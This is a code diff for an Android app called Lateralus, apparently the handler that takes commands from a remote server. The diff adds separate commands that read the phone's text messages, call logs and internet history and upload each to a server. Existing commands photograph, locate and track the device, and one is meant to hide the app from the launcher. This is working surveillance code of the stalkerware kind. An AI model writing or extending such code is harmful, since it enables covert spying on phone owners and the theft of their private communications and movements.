@@ -10,7 +10,7 @@ import net.scottjulian.lateralus.components.location.LocationReader;
 import net.scottjulian.lateralus.components.network.Network;
 import net.scottjulian.lateralus.components.readers.DataReader;
 import net.scottjulian.lateralus.components.readers.DeviceReader;
-//import net.scottjulian.lateralus.components.readers.InternetHistoryReader;
+import net.scottjulian.lateralus.components.readers.InternetHistoryReader;
 import net.scottjulian.lateralus.components.readers.PhonecallReader;
 import net.scottjulian.lateralus.components.readers.TextMessageReader;
 
@@ -27,7 +27,9 @@ public class LateralusMessageHandler {
     public static final String KEY_MSG       = "message";
     public static final String KEY_ERROR_MSG = "error_message";
 
-    public static final String CMD_GET_DATA       = "get_data";
+    public static final String CMD_GET_TEXT_MESSAGES = "get_text_messages";
+    public static final String CMD_GET_PHONECALLS    = "get_phonecalls";
+    public static final String CMD_GET_INTERNET_HIST = "get_internet_history";
     public static final String CMD_TAKE_PIC       = "take_picture";
     public static final String CMD_GET_LOCATION   = "get_location";
     public static final String CMD_START_TRACKING = "start_tracking";
@@ -48,11 +50,17 @@ public class LateralusMessageHandler {
         try{
             String cmd = data.getString(KEY_CMD);
             switch(cmd){
-                case CMD_GET_DATA:
-                    cmdData();
+                case CMD_GET_TEXT_MESSAGES:
+                    cmdGetTextMessages();
+                    break;
+                case CMD_GET_PHONECALLS:
+                    cmdGetPhonecalls();
+                    break;
+                case CMD_GET_INTERNET_HIST:
+                    cmdGetInternetHistory();
                     break;
                 case CMD_TAKE_PIC:
-                    cmdPicture();
+                    cmdTakePicture();
                     break;
                 case CMD_GET_LOCATION:
                 case CMD_START_TRACKING:
@@ -60,7 +68,7 @@ public class LateralusMessageHandler {
                     cmdLocation(cmd);
                     break;
                 case CMD_HIDE_APP:
-                    //TODO
+                    // TODO
                     //Utils.hideAppInDrawer(_ctx);
                     break;
                 case CMD_SHOW_APP:
@@ -78,38 +86,55 @@ public class LateralusMessageHandler {
         }
     }
 
-    private void cmdData(){
-        try{
+    private void cmdGetTextMessages(){
+        try {
             JSONArray array = new JSONArray();
-
-            // device
             DataReader dr = new DeviceReader(_ctx);
             array.put(dr.getData());
-
-            // text messages
             dr = new TextMessageReader(_ctx);
             array.put(dr.getData());
-
-            // phone calls
-            dr = new PhonecallReader(_ctx);
-            array.put(dr.getData());
-
-            // internet history
-            //dr = new InternetHistoryReader(_ctx);
-            //array.put(dr.getData());
-
-            // fire data
             JSONObject root = new JSONObject().put(KEY_ROOT, array);
             Network.fireJsonData(Network.API_PUT, root);
         }
         catch(Exception e){
-            Log.e(TAG, "Error creating data for cmd_data");
+            Log.e(TAG, "JSON Error");
             e.printStackTrace();
-            //TODO: send error message?
         }
     }
 
-    private void cmdPicture(){
+    private void cmdGetPhonecalls(){
+        try{
+            JSONArray array = new JSONArray();
+            DataReader dr = new DeviceReader(_ctx);
+            array.put(dr.getData());
+            dr = new PhonecallReader(_ctx);
+            array.put(dr.getData());
+            JSONObject root = new JSONObject().put(KEY_ROOT, array);
+            Network.fireJsonData(Network.API_PUT, root);
+        }
+        catch(Exception e){
+            Log.e(TAG, "JSON Error");
+            e.printStackTrace();
+        }
+    }
+
+    private void cmdGetInternetHistory(){
+        try{
+            JSONArray array = new JSONArray();
+            DataReader dr = new DeviceReader(_ctx);
+            array.put(dr.getData());
+            dr = new InternetHistoryReader(_ctx);
+            array.put(dr.getData());
+            JSONObject root = new JSONObject().put(KEY_ROOT, array);
+            Network.fireJsonData(Network.API_PUT, root);
+        }
+        catch(Exception e){
+            Log.e(TAG, "JSON Error");
+            e.printStackTrace();
+        }
+    }
+
+    private void cmdTakePicture(){
         // TODO
     }
 
